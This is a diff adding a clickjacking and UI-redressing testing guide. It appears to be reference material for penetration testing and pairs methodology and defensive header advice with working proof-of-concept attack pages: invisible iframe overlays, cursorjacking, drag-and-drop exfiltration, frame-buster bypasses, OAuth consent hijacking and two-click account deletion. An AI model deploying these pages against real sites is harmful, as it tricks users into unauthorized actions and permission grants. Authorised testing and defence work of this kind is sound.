@@ -1,0 +1,420 @@
+<clickjacking_guide>
+<title>CLICKJACKING / UI REDRESSING</title>
+
+<critical>Clickjacking attacks trick users into clicking hidden elements by overlaying transparent iframes or repositioning UI elements. This can lead to unauthorized actions, permission grants, and data theft. Modern browser protections (X-Frame-Options, CSP frame-ancestors) mitigate basic attacks, but sophisticated techniques and misconfigurations continue to enable exploitation.</critical>
+
+<scope>
+- Classic iframe overlay attacks
+- Cursorjacking (cursor position manipulation)
+- Likejacking (social media exploitation)
+- Drag-and-drop attacks (data exfiltration)
+- Touch-based clickjacking (mobile)
+- Double-click exploitation
+- Scroll-based attacks
+</scope>
+
+<methodology>
+1. Check for X-Frame-Options and CSP frame-ancestors headers.
+2. Test if target page can be embedded in iframes.
+3. Identify sensitive clickable actions (like buttons, form submissions).
+4. Create proof-of-concept pages demonstrating click hijacking.
+5. Test for partial protections and bypass techniques.
+</methodology>
+
+<detection>
+<header_analysis>
+{% raw %}
+# Check response headers
+# Missing or weak headers indicate vulnerability
+
+# X-Frame-Options values:
+X-Frame-Options: DENY                    # Blocks all framing
+X-Frame-Options: SAMEORIGIN              # Allows same-origin only
+X-Frame-Options: ALLOW-FROM https://...  # Deprecated, limited support
+
+# CSP frame-ancestors:
+Content-Security-Policy: frame-ancestors 'none'       # Blocks all framing
+Content-Security-Policy: frame-ancestors 'self'       # Same-origin only
+Content-Security-Policy: frame-ancestors https://...  # Specific origins
+
+# Vulnerability indicators:
+- No X-Frame-Options header
+- No CSP frame-ancestors directive
+- ALLOW-FROM with broad or attacker-controllable origins
+- Misconfigured wildcards in frame-ancestors
+{% endraw %}
+</header_analysis>
+
+<automated_testing>
+{% raw %}
+# JavaScript iframe test
+function testClickjacking(url) {
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.style.opacity = '0.5';
+    iframe.style.position = 'absolute';
+    
+    iframe.onload = function() {
+        console.log('Page can be framed - potentially vulnerable');
+    };
+    
+    iframe.onerror = function() {
+        console.log('Framing blocked by browser');
+    };
+    
+    document.body.appendChild(iframe);
+}
+{% endraw %}
+</automated_testing>
+</detection>
+
+<attack_techniques>
+<basic_clickjacking>
+{% raw %}
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking PoC</title>
+    <style>
+        iframe {
+            width: 800px;
+            height: 600px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0.0001;  /* Nearly invisible */
+            z-index: 2;
+        }
+        .decoy {
+            position: absolute;
+            top: 100px;  /* Aligned with target button */
+            left: 200px;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <h1>Click the button to win a prize!</h1>
+    <button class="decoy">CLAIM PRIZE</button>
+    <iframe src="https://target.com/sensitive-action"></iframe>
+</body>
+</html>
+{% endraw %}
+</basic_clickjacking>
+
+<multi_step_clickjacking>
+{% raw %}
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #step1, #step2, #step3 { display: none; position: absolute; }
+        #step1.active, #step2.active, #step3.active { display: block; }
+        iframe { opacity: 0.0001; position: absolute; z-index: 10; }
+    </style>
+</head>
+<body>
+    <div id="step1" class="active">
+        <h2>Step 1: Click Start</h2>
+        <button onclick="nextStep(2)">Start Game</button>
+        <iframe src="https://target.com/enable-feature"></iframe>
+    </div>
+    <div id="step2">
+        <h2>Step 2: Click Continue</h2>
+        <button onclick="nextStep(3)">Continue</button>
+        <iframe src="https://target.com/confirm-action"></iframe>
+    </div>
+    <div id="step3">
+        <h2>Step 3: Claim Prize</h2>
+        <button>Get Prize</button>
+        <iframe src="https://target.com/execute-action"></iframe>
+    </div>
+    <script>
+        function nextStep(step) {
+            document.querySelectorAll('[id^=step]').forEach(el => el.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+    </script>
+</body>
+</html>
+{% endraw %}
+</multi_step_clickjacking>
+
+<drag_drop_attack>
+{% raw %}
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #drag-source {
+            width: 100px; height: 100px;
+            background: gold;
+            cursor: move;
+        }
+        #hidden-iframe {
+            position: absolute;
+            opacity: 0.0001;
+            pointer-events: none;
+        }
+        #drop-target {
+            width: 200px; height: 200px;
+            border: 2px dashed gray;
+            position: relative;
+        }
+    </style>
+</head>
+<body>
+    <h1>Drag the gold box to the target!</h1>
+    <div id="drag-source" draggable="true">DRAG ME</div>
+    <div id="drop-target">
+        <iframe id="hidden-iframe" src="https://target.com/upload"></iframe>
+        DROP HERE
+    </div>
+    <script>
+        // Drag-drop clickjacking can exfiltrate selected text or files
+        document.getElementById('drag-source').addEventListener('dragstart', function(e) {
+            e.dataTransfer.setData('text/plain', document.getSelection().toString());
+        });
+    </script>
+</body>
+</html>
+{% endraw %}
+</drag_drop_attack>
+
+<cursorjacking>
+{% raw %}
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            cursor: none;  /* Hide real cursor */
+        }
+        #fake-cursor {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            background: url('cursor.png');
+            pointer-events: none;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <div id="fake-cursor"></div>
+    <p>Move your mouse and click the button</p>
+    <button style="position: absolute; left: 200px;">Safe Button</button>
+    <button style="position: absolute; left: 500px; opacity: 0.0001;">Dangerous Action</button>
+    
+    <script>
+        // Offset fake cursor from real position
+        document.addEventListener('mousemove', function(e) {
+            document.getElementById('fake-cursor').style.left = (e.clientX - 300) + 'px';
+            document.getElementById('fake-cursor').style.top = e.clientY + 'px';
+        });
+    </script>
+</body>
+</html>
+{% endraw %}
+</cursorjacking>
+
+<double_click_attack>
+{% raw %}
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
+        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5; opacity: 0.0001; }
+    </style>
+</head>
+<body>
+    <div id="overlay">
+        <h1>Double-click anywhere to continue!</h1>
+    </div>
+    <iframe src="https://target.com/dangerous-action"></iframe>
+    
+    <script>
+        // First click removes overlay, second click hits iframe
+        document.getElementById('overlay').addEventListener('click', function() {
+            this.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
+{% endraw %}
+</double_click_attack>
+</attack_techniques>
+
+<bypass_techniques>
+<sandbox_bypass>
+{% raw %}
+# sandbox attribute without allow-scripts
+<iframe sandbox="allow-forms" src="https://target.com/action">
+# Forms still work, may bypass some protections
+
+# sandbox with allow-top-navigation
+<iframe sandbox="allow-scripts allow-top-navigation" src="...">
+# Can redirect parent window
+{% endraw %}
+</sandbox_bypass>
+
+<frame_buster_bypass>
+{% raw %}
+# Bypass JavaScript frame busters
+
+# Using sandbox (blocks scripts)
+<iframe sandbox src="https://target.com">
+
+# Using srcdoc to modify content
+<iframe srcdoc="<script>window.top = window.self;</script>...">
+
+# Blocking beforeunload
+<script>
+window.onbeforeunload = function() { return false; };
+</script>
+<iframe src="https://target.com">
+
+# Double framing
+<iframe src="https://attacker.com/frame.html">
+  <!-- frame.html contains -->
+  <iframe src="https://target.com">
+</iframe>
+{% endraw %}
+</frame_buster_bypass>
+
+<mobile_specific>
+{% raw %}
+# Touch-based attacks
+# Mobile browsers may have different protections
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        iframe { 
+            position: absolute;
+            opacity: 0.0001;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+</head>
+<body>
+    <button style="width: 100%; padding: 50px; font-size: 24px;">
+        Tap to Continue
+    </button>
+    <iframe src="https://target.com/mobile-action"></iframe>
+</body>
+</html>
+{% endraw %}
+</mobile_specific>
+
+<csp_bypass>
+{% raw %}
+# frame-ancestors bypass scenarios
+
+# Overly permissive wildcards
+frame-ancestors *.example.com  # Subdomain takeover = bypass
+frame-ancestors https://*      # Any HTTPS site
+
+# Parser differential
+# Some browsers parse frame-ancestors differently
+
+# Missing on specific pages
+# Check if all sensitive pages have protection
+{% endraw %}
+</csp_bypass>
+</bypass_techniques>
+
+<exploitation_scenarios>
+<oauth_clickjacking>
+{% raw %}
+# Trick user into granting OAuth permissions
+
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Login to continue</h1>
+    <button>Click to Login</button>
+    <iframe style="opacity: 0.0001; position: absolute;"
+            src="https://accounts.google.com/o/oauth2/auth?...&scope=admin">
+    </iframe>
+</body>
+</html>
+{% endraw %}
+</oauth_clickjacking>
+
+<account_deletion>
+{% raw %}
+# Two-step clickjacking for account deletion
+
+# Step 1: Navigate to delete page via first click
+# Step 2: Confirm deletion via second click
+
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Play our game!</h1>
+    <button id="button1" onclick="step2()">Click 1</button>
+    <button id="button2" style="display:none" onclick="step3()">Click 2</button>
+    
+    <iframe id="frame" style="opacity: 0.0001; position: absolute;"
+            src="https://target.com/settings/delete">
+    </iframe>
+    
+    <script>
+        function step2() {
+            document.getElementById('button1').style.display = 'none';
+            document.getElementById('button2').style.display = 'block';
+            document.getElementById('frame').src = 'https://target.com/settings/delete/confirm';
+        }
+    </script>
+</body>
+</html>
+{% endraw %}
+</account_deletion>
+</exploitation_scenarios>
+
+<validation>
+1. Confirm missing or misconfigured X-Frame-Options/CSP frame-ancestors.
+2. Create working PoC demonstrating sensitive action via click hijacking.
+3. Show the attack works against real functionality (not just embedding).
+4. Demonstrate user interaction leads to unintended privileged action.
+5. Test across multiple browsers to confirm consistent vulnerability.
+</validation>
+
+<false_positives>
+- Pages without sensitive clickable actions
+- Read-only pages with no state-changing operations
+- Proper X-Frame-Options or frame-ancestors in place
+- JavaScript frame busters that cannot be bypassed
+- CSRF tokens required for state-changing actions
+</false_positives>
+
+<impact>
+- Unauthorized actions on behalf of victim
+- OAuth permission grants to attacker apps
+- Account settings modification
+- Fund transfers or purchases
+- Social engineering amplification
+- Data exfiltration via drag-and-drop
+- Permission grants (camera, microphone, location)
+</impact>
+
+<pro_tips>
+1. Always check for BOTH X-Frame-Options AND CSP frame-ancestors.
+2. Test sensitive pages individually - protection may be inconsistent.
+3. Use browser DevTools to verify framing behavior.
+4. Multi-step actions require multi-click PoCs.
+5. Mobile browsers may have different protections - test specifically.
+6. OAuth authorization pages are high-value clickjacking targets.
+7. Drag-and-drop attacks can exfiltrate selected text content.
+8. sandbox attribute can bypass JavaScript frame busters.
+9. Combine with social engineering for realistic attack scenarios.
+10. Check if SameSite cookies provide additional protection.
+</pro_tips>
+
+<remember>Clickjacking transforms visible UI into a deception layer. Defense requires proper HTTP headers (X-Frame-Options and CSP frame-ancestors), CSRF tokens for state changes, and user confirmation for sensitive operations. Always create realistic PoCs that demonstrate actual security impact.</remember>
+</clickjacking_guide>
